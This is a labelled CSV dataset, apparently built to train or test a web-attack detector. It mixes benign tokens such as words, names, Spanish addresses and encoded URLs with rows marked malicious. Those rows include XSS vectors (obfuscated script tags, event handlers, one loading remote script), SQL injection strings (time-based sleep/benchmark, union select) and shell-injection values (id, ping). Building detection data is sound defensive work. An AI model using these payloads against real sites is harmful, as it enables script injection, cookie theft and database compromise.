index,payload,is_malicious,injection_type
3636,tyron,0.0,LEGAL
3637,Maestre+Camprubi,0.0,LEGAL
3638,pungent,0.0,LEGAL
3639,plumes,0.0,LEGAL
3640,dreaming,0.0,LEGAL
3641,cynic,0.0,LEGAL
3642,orgy,0.0,LEGAL
3643,Bardo,0.0,LEGAL
3644,Rossenberck,0.0,LEGAL
3645,unreliable,0.0,LEGAL
3646,a);id;,1.0,SHELL
3647,C%2F+Escultor+Peresejo%2C+S%2FN+4%3FD,0.0,LEGAL
3648,http%3A%2F%2Fad.doubleclick.net%2Fad%2FN5043.Yahoo%2FB3311270.246%3Bsz%3D1x1%3Bord%3D1258502324510442%3F,0.0,LEGAL
3649,storgaard-szibo3%40elreversotenebroso.ky,0.0,LEGAL
3650,Amour,0.0,LEGAL
3651,02624260Y,0.0,LEGAL
3652,gila-berova%40artforall.mm,0.0,LEGAL
3653,crustacean,0.0,LEGAL
3654,ca-pub-5541698698121400,0.0,LEGAL
3655,Odilia,0.0,LEGAL
3656,lonnie,0.0,LEGAL
3657,bathtubs,0.0,LEGAL
3658,<img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1.0,XSS
3659,Graciana,0.0,LEGAL
3660,conveyances,0.0,LEGAL
3661,49519,0.0,LEGAL
3662,translatable,0.0,LEGAL
3663,Wei,0.0,LEGAL
3664,"<script>x=""""<<prompt(9)<<"""";y=42;</script>",1.0,XSS
3665,stilts,0.0,LEGAL
3666,Ellynn,0.0,LEGAL
3667,“><s”%2b”cript>alert(1)</script>,1.0,XSS
3668,dealing,0.0,LEGAL
3669,initialing,0.0,LEGAL
3670,16648,0.0,LEGAL
3671,' and 1=(select 1)+',1.0,SQL
3672,&#x00003e,1.0,XSS
3673,"(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}//<img src=""x:x"" onerror=""if(location.hash){eval(location.hash.slice(1))}else{confirm(document.location)}"">",1.0,XSS
3674,Laracha%2C+A,0.0,LEGAL
3675,http%3A%2F%2Fomen-of-clarity.blogspot.com%2F2009%2F04%2Fbreaking-news-imangle-rotation-owns.html,0.0,LEGAL
3676,braverma,0.0,LEGAL
3677,http%3A%2F%2Fview.atdmt.com%2FCNT%2Fview%2F176118288%2Fdirect%3Bwi.1%3Bhi.1%2F01%2F%3F1257904685,0.0,LEGAL
3678,irrigate,0.0,LEGAL
3679,Islamizes,0.0,LEGAL
3680,enjoining,0.0,LEGAL
3681,Zorina,0.0,LEGAL
3682,waldridge%40hojainformativa.gn,0.0,LEGAL
3683,Pintor+Martin+Gonzalez%2C+140%2C+8%3FB,0.0,LEGAL
3684,Jimmy,0.0,LEGAL
3685,mighty,0.0,LEGAL
3686,outstrips,0.0,LEGAL
3687,43694,0.0,LEGAL
3688,6961855330943947,0.0,LEGAL
3689,tsonglia4,0.0,LEGAL
3690,aniseikonic,0.0,LEGAL
3691,pronouncing,0.0,LEGAL
3692,penultimate,0.0,LEGAL
3693,Loveland,0.0,LEGAL
3694,ping\x09-w\x098000\x09-n\x091\x094.3.2.1,0.0,LEGAL
3695,Benapr%E9s+Vaqu%E9,0.0,LEGAL
3696,12370442F,0.0,LEGAL
3697,"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>",1.0,XSS
3698,idealize,0.0,LEGAL
3699,Lotte,0.0,LEGAL
3700,doublet,0.0,LEGAL
3701,oiling,0.0,LEGAL
3702,2006-0,0.0,LEGAL
3703,flip,0.0,LEGAL
3704,' and 1=1 'a'='a,1.0,SQL
3705,Tasia,0.0,LEGAL
3706,Calle+Alamillos+De+San+Cecilio+138+11-B,0.0,LEGAL
3707,semantic,0.0,LEGAL
3708,festive,0.0,LEGAL
3709,allegretto,0.0,LEGAL
3710,Ciega+151+4%3FB,0.0,LEGAL
3711,Pliny,0.0,LEGAL
3712,grieves,0.0,LEGAL
3713,overworked,0.0,LEGAL
3714,boskova_busey%40piensoparaperros.qa,0.0,LEGAL
3715,Celestyna,0.0,LEGAL
3716,returning,0.0,LEGAL
3717,burn,0.0,LEGAL
3718,2804622035636045,0.0,LEGAL
3719,"<!--#exec cmd=""cd C:\WINDOWS\System32"">",1.0,XSS
3720,Congress+Ave.+300-449,0.0,LEGAL
3721,expounder,0.0,LEGAL
3722,candidates,0.0,LEGAL
3723,apo9%D30ICO,0.0,LEGAL
3724,categorical,0.0,LEGAL
3725,swarthy,0.0,LEGAL
3726,[a@http://www.phpmyadmin.net/home_page/security/pmasa-2010-9.php@_self]click here[/a],0.0,LEGAL
3727,directed,0.0,LEGAL
3728,2319,0.0,LEGAL
3729,Finns,0.0,LEGAL
3730,Lumbrales,0.0,LEGAL
3731,boastful,0.0,LEGAL
3732,1/confirm(1),1.0,XSS
3733,dominance,0.0,LEGAL
3734,Washburn,0.0,LEGAL
3735,Beata,0.0,LEGAL
3736,1902,0.0,LEGAL
3737,Alc%FAdia+de+Crespins%2C+l%27,0.0,LEGAL
3738,scrimmage,0.0,LEGAL
3739,nHWAVmIgS-M_pK5-9Kpp6A,0.0,LEGAL
3740,silks,0.0,LEGAL
3741,Cirera+Collantes,0.0,LEGAL
3742,angularly,0.0,LEGAL
3743,San+Lorenzo+de+Calatrava,0.0,LEGAL
3744,devotion,0.0,LEGAL
3745,carried,0.0,LEGAL
3746,http%3A%2F%2Fwww.blazingswarm.com%2F2009%2F10%2Fshakira-she-wolf-album.html,0.0,LEGAL
3747,50806754F,0.0,LEGAL
3748,embroiders,0.0,LEGAL
3749,5656630.936855968716,0.0,LEGAL
3750,Ignacia,0.0,LEGAL
3751,00000000,0.0,LEGAL
3752,becoming,0.0,LEGAL
3753,duplicable,0.0,LEGAL
3754,"<object><param name=""src"" value=""javascript:alert(0)""></param></object>",1.0,XSS
3755,aa,0.0,LEGAL
3756,5705,0.0,LEGAL
3757,Hoosierizes,0.0,LEGAL
3758,"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",1.0,XSS
3759,Herodes,0.0,LEGAL
3760,Ricote,0.0,LEGAL
3761,thwarting,0.0,LEGAL
3762,http%3A%2F%2Fwww.textsfromlastnight.com%2Frecent%2F3,0.0,LEGAL
3763,07089695942503505110,0.0,LEGAL
3764,Birminghamize,0.0,LEGAL
3765,5ud7torio,0.0,LEGAL
3766,amargaz%F3n,0.0,LEGAL
3767,gasp,0.0,LEGAL
3768,"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",1.0,XSS
3769,43761,0.0,LEGAL
3770,capabilities,0.0,LEGAL
3771,nekueey,0.0,LEGAL
3772,"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",1.0,SQL
3773,Jeannette,0.0,LEGAL
3774,C%2F+Elcano%2C+184%2C+12%3FC,0.0,LEGAL
3775,"<img \x39src=x onerror=""javascript:alert(1)"">",1.0,XSS
3776,lees,0.0,LEGAL
3777,</script>,1.0,XSS
3778,Calle+Baena+194+8%3FA,0.0,LEGAL
3779,Alys,0.0,LEGAL
3780,British,0.0,LEGAL
3781,9884100419399604,0.0,LEGAL
3782,secretively,0.0,LEGAL
3783,9517,0.0,LEGAL
3784,3mo5c8po,0.0,LEGAL
3785,3e1vieja7,0.0,LEGAL
3786,Onila,0.0,LEGAL
3787,truncations,0.0,LEGAL
3788,Almaden,0.0,LEGAL
3789,@variable,1.0,SQL
3790,"<form name=self location=""javascript&amp;#58;alert(1)""></form><script>if(top!=self){top.location=self.location}</script>",1.0,XSS
3791,potassium,0.0,LEGAL
3792,restrain,0.0,LEGAL
3793,Knudson,0.0,LEGAL
3794,gareis,0.0,LEGAL
3795,gowns,0.0,LEGAL
3796,ownerships,0.0,LEGAL
3797,nonorthogonal,0.0,LEGAL
3798,conferences,0.0,LEGAL
3799,oblong0,0.0,LEGAL
3800,leftwich%40sms24h.sb,0.0,LEGAL
3801,Saura,0.0,LEGAL
3802,"<meta http-equiv=""X-UA-Compatible"" content=""IE=5""><a style=""font-family:}behavior=URL(\.sct)"">B",1.0,XSS
3803,17619149870999407388,0.0,LEGAL
3804,faust2%40cocheacoche.cg,0.0,LEGAL
3805,Alepio,0.0,LEGAL
3806,Valseca,0.0,LEGAL
3807,shoots,0.0,LEGAL
3808,nicks%40guejosgratis.pt,0.0,LEGAL
3809,smallness,0.0,LEGAL
3810,o0rE,0.0,LEGAL
3811,8106893265413506,0.0,LEGAL
3812,Ferr%E9,0.0,LEGAL
3813,1258003722291,0.0,LEGAL
3814,Auro,0.0,LEGAL
3815,jermain,0.0,LEGAL
3816,Cornelle,0.0,LEGAL
3817,29380,0.0,LEGAL
3818,1331749596,0.0,LEGAL
3819,bernard,0.0,LEGAL
3820,svilans,0.0,LEGAL
3821,bandits,0.0,LEGAL
3822,2281383911416471,0.0,LEGAL
3823,Reedville,0.0,LEGAL
3824,diffusing,0.0,LEGAL
3825,despicable,0.0,LEGAL
3826,indebtedness,0.0,LEGAL
3827,Balconch%E1n,0.0,LEGAL
3828,adopters,0.0,LEGAL
3829,presser,0.0,LEGAL
3830,tenors,0.0,LEGAL
3831,polly,0.0,LEGAL
3832,diligently,0.0,LEGAL
3833,artist,0.0,LEGAL
3834,advisability,0.0,LEGAL
3835,strictest,0.0,LEGAL
3836,30827206F,0.0,LEGAL
3837,acculturated,0.0,LEGAL
3838,critique,0.0,LEGAL
3839,functionally,0.0,LEGAL
3840,&#X3c;,1.0,XSS
3841,exclusively,0.0,LEGAL
3842,8326141547735911,0.0,LEGAL
3843,Thebes,0.0,LEGAL
3844,.orig,0.0,LEGAL
3845,mothering,0.0,LEGAL
3846,Chandal,0.0,LEGAL
3847,Lakuaburua%2C+S%2FN%2C+8-A,0.0,LEGAL
3848,14178670017744819134,0.0,LEGAL
3849,C%2F+Tamarindo+170+,0.0,LEGAL
3850,valdesta%40arvigar.mm,0.0,LEGAL
3851,Cambras+Sent%EDs,0.0,LEGAL
3852,01722111D,0.0,LEGAL
3853,Calle+Nuestra+Se%F1ora+Del+Portal+S%2FN%2C+,0.0,LEGAL
3854,eminence,0.0,LEGAL
3855,sheba,0.0,LEGAL
3856,<SCRIPT SRC=//ha.ckers.org/.j>,1.0,XSS
3857,AGiWqtzoK12qq2k6QUhELh7AovahxqilQA,0.0,LEGAL
3858,creature,0.0,LEGAL
3859,darkness,0.0,LEGAL
3860,aurally,0.0,LEGAL
3861,50227,0.0,LEGAL
3862,ov%E1rico,0.0,LEGAL
3863,statewide,0.0,LEGAL
3864,comer,0.0,LEGAL
3865,Kishore,0.0,LEGAL
3866,Evelina,0.0,LEGAL
3867,Caledonio,0.0,LEGAL
3868,sugars,0.0,LEGAL
3869,37488,0.0,LEGAL
3870,since,0.0,LEGAL
3871,nasit_barscha%40cortinas-de-aire.eh,0.0,LEGAL
3872,Tiz%F3n+Otago,0.0,LEGAL
3873,bungling,0.0,LEGAL
3874,amputate,0.0,LEGAL
3875,borderings,0.0,LEGAL
3876,united,0.0,LEGAL
3877,appointers,0.0,LEGAL
3878,clobber,0.0,LEGAL
3879,Sunday,0.0,LEGAL
3880,Yugoslavia,0.0,LEGAL
3881,adg,0.0,LEGAL
3882,robena1,0.0,LEGAL
3883,peas,0.0,LEGAL
3884,sa3a,0.0,LEGAL
3885,postfix,0.0,LEGAL
3886,hanns,0.0,LEGAL
3887,bequeathing,0.0,LEGAL
3888,tither,0.0,LEGAL
3889,scary,0.0,LEGAL
3890,askance,0.0,LEGAL
3891,Karyl,0.0,LEGAL
3892,propounded,0.0,LEGAL
3893,Helenka,0.0,LEGAL
3894,interrelations,0.0,LEGAL
3895,"'><a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(1)"">XXX</a>",1.0,XSS
3896,select user from dual,1.0,SQL
3897,burglarproofing,0.0,LEGAL
3898,K;ko,0.0,LEGAL
3899,58013601B,0.0,LEGAL
3900,Mucientes,0.0,LEGAL
3901,Kristie,0.0,LEGAL
3902,rusting,0.0,LEGAL
3903,wallows,0.0,LEGAL
3904,1331731296,0.0,LEGAL
3905,Constantinople,0.0,LEGAL
3906,San+Juan+Bosco+113+1-D,0.0,LEGAL
3907,strings,0.0,LEGAL
3908,shawl,0.0,LEGAL
3909,terri,0.0,LEGAL
3910,07984677C,0.0,LEGAL
3911,cultivated,0.0,LEGAL
3912,lieu,0.0,LEGAL
3913,flue,0.0,LEGAL
3914,Moratilla+de+los+Meleros,0.0,LEGAL
3915,Edgewood,0.0,LEGAL
3916,Cuban,0.0,LEGAL
3917,Ge,0.0,LEGAL
3918,violating,0.0,LEGAL
3919,07638177S,0.0,LEGAL
3920,cashing,0.0,LEGAL
3921,saves,0.0,LEGAL
3922,macnaugh,0.0,LEGAL
3923,employers,0.0,LEGAL
3924,Vilamaj%F3+Falc%F3,0.0,LEGAL
3925,",http%3A%2F%2Fus.ard.yahoo.com%2FSIG%3D15m1lj8im%2FM%3D715481.13514798.13596946.8454630%2FD%3Dpager%2FS%3D97420565%3AHB%2F_ylc%3DX3oDMTB2c3FscDhuBF9TAzk3NDIwNTY1BF9hAwRwAzQwOTY0MARwb3MDSEI-%2FY%3DYAHOO%2FEXP%3D1258366638%2FL%3DtZrdmNG_eB6spYDHfBE0yCRJlaEySksBCo4AA89I%2FB%3Dd3A2JtG_Upk-%2FJ%3D1258359438262656%2FK%3DpxIEGYEsnpQpRbB_qoaCPw%2FA%3D5758436%2FR%3D0%2F%2A%24,http%3A%2F%2Finsider.msg.yahoo.com%2Fclient_ad.php%3Fp%3D409640%26fmt%3D2.0%26intl%3Dus%26os%3Dwin%26ver%3D9.0.0.2152,",0.0,LEGAL
3926,celebrities,0.0,LEGAL
3927,Palacios+del+Arzobispo,0.0,LEGAL
3928,9475732136741046,0.0,LEGAL
3929,Roberta,0.0,LEGAL
3930,09615,0.0,LEGAL
3931,1) and sleep(50)--,1.0,SQL
3932,comprise,0.0,LEGAL
3933,maggots,0.0,LEGAL
3934,Jaraba+Villa,0.0,LEGAL
3935,"'><img src='vbscript:do%63ument.lo%63ation=""http://127.0.0.1:3555/xss_serve_payloads/X.html""'>",1.0,XSS
3936,intentionally,0.0,LEGAL
3937,%uff1cscript%uff1ealert(\x18XSS\x19);%uff1c/script%uff1e,1.0,XSS
3938,1258212744948,0.0,LEGAL
3939,Bonn%EDn+Genove,0.0,LEGAL
3940,ensembles,0.0,LEGAL
3941,attaching,0.0,LEGAL
3942,Emil,0.0,LEGAL
3943,dungan,0.0,LEGAL
3944,footsteps,0.0,LEGAL
3945,moskuna%40sitcpla.ye,0.0,LEGAL
3946,Grupo+Ibargain+78+3%3FC,0.0,LEGAL
3947,wistfully,0.0,LEGAL
3948,kaz,0.0,LEGAL
3949,"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",1.0,XSS
3950,Coma+i+la+Pedra%2C+La,0.0,LEGAL
3951,minoring,0.0,LEGAL
3952,Jacynth,0.0,LEGAL
3953,Boswellize,0.0,LEGAL
3954,Isobel,0.0,LEGAL
3955,Maxy,0.0,LEGAL
3956,salwa,0.0,LEGAL
3957,Sunbelt,0.0,LEGAL
3958,regaled,0.0,LEGAL
3959,Suzi,0.0,LEGAL
3960,nonexistant499164296,0.0,LEGAL
3961,Calle+Medina+Azahara+136+5F,0.0,LEGAL
3962,pedley,0.0,LEGAL
3963,rm\xa0q79682776,0.0,LEGAL
3964,washings,0.0,LEGAL
3965,<// style=x:expression\28write(1)\29>,1.0,XSS
3966,bewildered,0.0,LEGAL
3967,sketchbook,0.0,LEGAL
3968,1331995589898,0.0,LEGAL
3969,bellyfull,0.0,LEGAL
3970,sundries,0.0,LEGAL
3971,servomechanism,0.0,LEGAL
3972,6684,0.0,LEGAL
3973,beached,0.0,LEGAL
3974,Pinilla+del+Campo,0.0,LEGAL
3975,ConsoNAmientO,0.0,LEGAL
3976,Dempsey,0.0,LEGAL
3977,predominate,0.0,LEGAL
3978,expects,0.0,LEGAL
3979,bluest,0.0,LEGAL
3980,1541713650880969,0.0,LEGAL
3981,prohibitively,0.0,LEGAL
3982,envious,0.0,LEGAL
3983,Alcantud,0.0,LEGAL
3984,Ontinyent,0.0,LEGAL
3985,A8Cyy4uzrSDJ0IjEzKrFcm,0.0,LEGAL
3986,marvelously,0.0,LEGAL
3987,macko%40barebackespa%F1a.mq,0.0,LEGAL
3988,//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////,1.0,XSS
3989,braes,0.0,LEGAL
3990,Palmolive,0.0,LEGAL
3991,&l=eaedfaedae%22);}alert('xss');{//,1.0,XSS
3992,Hrothgar,0.0,LEGAL
3993,33ta08o0ner5,0.0,LEGAL
3994,duisman,0.0,LEGAL
3995,zool%F37IC1,0.0,LEGAL
3996,"1&""><script>alert(1)</script>=1",1.0,XSS
3997,46809362S,0.0,LEGAL
3998,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS",1.0,XSS
3999,scenarios,0.0,LEGAL
4000,Guhleman,0.0,LEGAL
4001,5546525855546960,0.0,LEGAL
4002,martial,0.0,LEGAL
4003,interposing,0.0,LEGAL
4004,clamping,0.0,LEGAL
4005,m%E1QuINa,0.0,LEGAL
4006,05309,0.0,LEGAL
4007,drop,0.0,LEGAL
4008,Nassau,0.0,LEGAL
4009,07559284N,0.0,LEGAL
4010,freestyle,0.0,LEGAL
4011,revocable,0.0,LEGAL
4012,montiel%40sitienesunawebtienesunnegocio.cf,0.0,LEGAL
4013,wretch,0.0,LEGAL
4014,insolent,0.0,LEGAL
4015,shortstop,0.0,LEGAL
4016,guiltily,0.0,LEGAL
4017,ti20,0.0,LEGAL
4018,fairness,0.0,LEGAL
4019,Caralt+Magrans,0.0,LEGAL
4020,Bissau,0.0,LEGAL
4021,Burlingame,0.0,LEGAL
4022,Johan,0.0,LEGAL
4023,Munaz,0.0,LEGAL
4024,irrelevantly,0.0,LEGAL
4025,ruffian,0.0,LEGAL
4026,reconfigured,0.0,LEGAL
4027,SZ-3985,0.0,LEGAL
4028,justifier,0.0,LEGAL
4029,impulse,0.0,LEGAL
4030,perils,0.0,LEGAL
4031,stirring,0.0,LEGAL
4032,upgrades,0.0,LEGAL
4033,Babylonizes,0.0,LEGAL
4034,37216,0.0,LEGAL
4035,abandoned,0.0,LEGAL
4036,Juliann,0.0,LEGAL
4037,Calle+Mercurio%2C+19%2C+,0.0,LEGAL
4038,Taurus,0.0,LEGAL
4039,90959845C,0.0,LEGAL
4040,asdfjkl;,0.0,LEGAL
4041,"""<A HREF=""""http://0x42.0x0000066.0x7.0x93/"""">XSS</A>""",1.0,XSS
4042,firing,0.0,LEGAL
4043,sixgun,0.0,LEGAL
4044,%0a ping -i 30 127.0.0.1 %0a,1.0,SHELL
4045,5697783044165984,0.0,LEGAL
4046,/fckeditor_currentfolder_file_upload-1331905254.php.,0.0,LEGAL
4047,"<IMG SRC=# onmouseover=""alert('X')"">",1.0,XSS
4048,"&lt;label class=""&lt;% confirm(1) %&gt;""&gt;",1.0,XSS
4049,multispe,0.0,LEGAL
4050,Brunori,0.0,LEGAL
4051,"""><IMG SRC=javascript:alert(1)>",1.0,XSS
4052,Vimi,0.0,LEGAL
4053,manometers,0.0,LEGAL
4054,Amandie,0.0,LEGAL
4055,kimono,0.0,LEGAL
4056,berrell%40lingote.com.nf,0.0,LEGAL
4057,magnifies,0.0,LEGAL
4058,sends,0.0,LEGAL
4059,52509626M,0.0,LEGAL
4060,adaptor,0.0,LEGAL
4061,2976498415319446,0.0,LEGAL
4062,10866,0.0,LEGAL
4063,Deutsch,0.0,LEGAL
4064,aspirated,0.0,LEGAL
4065,Torre+de+Cabdella%2C+La,0.0,LEGAL
4066,spilling,0.0,LEGAL
4067,cozy,0.0,LEGAL
4068,impostor,0.0,LEGAL
4069,<form name=location >,1.0,XSS
4070,recreation,0.0,LEGAL
4071,napper,0.0,LEGAL
4072,raudres,0.0,LEGAL
4073,50932385N,0.0,LEGAL
4074,8338139974007046,0.0,LEGAL
4075,ellipse,0.0,LEGAL
4076,c:\inetpub\ftproot,0.0,LEGAL
4077,Praza+Valentin+Garcia+Escudero+87%2C+,0.0,LEGAL
4078,rocket,0.0,LEGAL
4079,traverses,0.0,LEGAL
4080,nocturnal,0.0,LEGAL
4081,quorum,0.0,LEGAL
4082,http://xxxx./,0.0,LEGAL
4083,Guinea+50%2C+10%3FA,0.0,LEGAL
4084,otu0mty4@,0.0,LEGAL
4085,Alton,0.0,LEGAL
4086,35726679C,0.0,LEGAL
4087,polloi,0.0,LEGAL
4088,a'||%0a345%0alIke%0a345-- #,1.0,SQL
4089,deutsch,0.0,LEGAL
4090,Armentario,0.0,LEGAL
4091,shinbone,0.0,LEGAL
4092,ikebe.king%40zarasalud.us,0.0,LEGAL
4093,dursse,0.0,LEGAL
4094,1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc,1.0,SQL
4095,05163,0.0,LEGAL
4096,combee,0.0,LEGAL
4097,chastising,0.0,LEGAL
4098,orthogonally,0.0,LEGAL
4099,majored,0.0,LEGAL
4100,simaan,0.0,LEGAL
4101,let,0.0,LEGAL
4102,upturning,0.0,LEGAL
4103,affective,0.0,LEGAL
4104,<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>,1.0,XSS
4105,nonexistant1713265683,0.0,LEGAL
4106,smeenk,0.0,LEGAL
4107,nonexistant657544209,0.0,LEGAL
4108,Normanizations,0.0,LEGAL
4109,sprung,0.0,LEGAL
4110,%253cscript%253ealert(document.cookie)%253c/script%253e,1.0,XSS
4111,del\x09q57528363\x09#,0.0,LEGAL
4112,\x0adel\x09q86474454\x09#,0.0,LEGAL
4113,-fiSiol%F3gicamente,0.0,LEGAL
4114,Diandra,0.0,LEGAL
4115,trivia,0.0,LEGAL
4116,cringed,0.0,LEGAL
4117,frantically,0.0,LEGAL
4118,adnado,0.0,LEGAL
4119,http%3A%2F%2Fsandwalk.blogspot.com%2F2009%2F11%2Fwreck-of-edmund-fitzgerald.html,0.0,LEGAL
4120,telegraphed,0.0,LEGAL
4121,pOnDerADO,0.0,LEGAL
4122,columnizes,0.0,LEGAL
4123,strider,0.0,LEGAL
4124,1258340597031,0.0,LEGAL
4125,overall-alvardo%40fortelingenieria.ge,0.0,LEGAL
4126,conjugate,0.0,LEGAL
4127,Begum,0.0,LEGAL
4128,Utah,0.0,LEGAL
4129,'><script>alert(123);</script x=',1.0,XSS
4130,winking,0.0,LEGAL
4131,indifferently,0.0,LEGAL
4132,need,0.0,LEGAL
4133,skyscrapers,0.0,LEGAL
4134,http%3A%2F%2Ftooman,0.0,LEGAL
4135,86935034W,0.0,LEGAL
4136,http%3A%2F%2Fmaribergebang.blogspot.com%2F,0.0,LEGAL
4137,&content=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1.0,XSS
4138,2533,0.0,LEGAL
4139,Sikh,0.0,LEGAL
4140,<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>,1.0,XSS
4141,rendition,0.0,LEGAL
4142,Dahlia,0.0,LEGAL
4143,kamekona%40gopersonaltrainers.fj,0.0,LEGAL
4144,yancy-xiaoguang%40telogis.nr,0.0,LEGAL
4145,porpoise,0.0,LEGAL
4146,subverting,0.0,LEGAL
4147,decks,0.0,LEGAL
4148,2702,0.0,LEGAL
4149,Robledillo+de+Mohernando,0.0,LEGAL
4150,56030847H,0.0,LEGAL
4151,Aill%F3n+Paniagua,0.0,LEGAL
4152,topologies,0.0,LEGAL
4153,silt,0.0,LEGAL
4154,injections,0.0,LEGAL
4155,khue,0.0,LEGAL
4156,16537,0.0,LEGAL
4157,celica,0.0,LEGAL
4158,"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1.0,XSS
4159,C%2F+Apuko%2C+34+,0.0,LEGAL
4160,"'><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/X/) type=submit>'-->""></script><script>alert(1)</script>",1.0,XSS
4161,ruffled,0.0,LEGAL
4162,29791,0.0,LEGAL
4163,Product%20Page,0.0,LEGAL
4164,<<script>document.cookie=true;</script>,1.0,XSS
4165,ledenburg.clapp%40serviconlevante.museum,0.0,LEGAL
4166,Jackelyn,0.0,LEGAL
4167,Wilmont,0.0,LEGAL
4168,88918773Z,0.0,LEGAL
4169,8320919959502275,0.0,LEGAL
4170,collides,0.0,LEGAL
4171,plastering,0.0,LEGAL
4172,connoisseurs,0.0,LEGAL
4173,sector,0.0,LEGAL
4174,brochures,0.0,LEGAL
4175,Anni,0.0,LEGAL
4176,finest,0.0,LEGAL
4177,Bianka,0.0,LEGAL
4178,Mutiloa,0.0,LEGAL
4179,6805,0.0,LEGAL
4180,bot%EDn,0.0,LEGAL
4181,75114987T,0.0,LEGAL
4182,del\x09q38266346\x09#,0.0,LEGAL
4183,dissociation,0.0,LEGAL
4184,obliteration,0.0,LEGAL
4185,Felton,0.0,LEGAL
4186,Jaffer,0.0,LEGAL
4187,parallelogram,0.0,LEGAL
4188,solar,0.0,LEGAL
4189,S%EDmuta+Ochotorrena,0.0,LEGAL
4190,detest,0.0,LEGAL
4191,Belvia,0.0,LEGAL
4192,malee,0.0,LEGAL
4193,Veen,0.0,LEGAL
4194,audiometric,0.0,LEGAL
4195,dorsay%40ustream.cc,0.0,LEGAL
4196,Mami,0.0,LEGAL
4197,abutting,0.0,LEGAL
4198,Concejo+De+Alzuza%2C+47%2C+,0.0,LEGAL
4199,Sherye,0.0,LEGAL
4200,diessl-claver%40tradedeficit.mz,0.0,LEGAL
4201,animosity,0.0,LEGAL
4202,necessitate,0.0,LEGAL
4203,hirers,0.0,LEGAL
4204,unfolding,0.0,LEGAL
4205,defiling,0.0,LEGAL
4206,Canute,0.0,LEGAL
4207,5254,0.0,LEGAL
4208,Downs,0.0,LEGAL
4209,"'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*",1.0,SQL
4210,Bili,0.0,LEGAL
4211,Villanueva+de+Carazo,0.0,LEGAL
4212,"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""X"")>",1.0,XSS
4213,q42948641,0.0,LEGAL
4214,1010,0.0,LEGAL
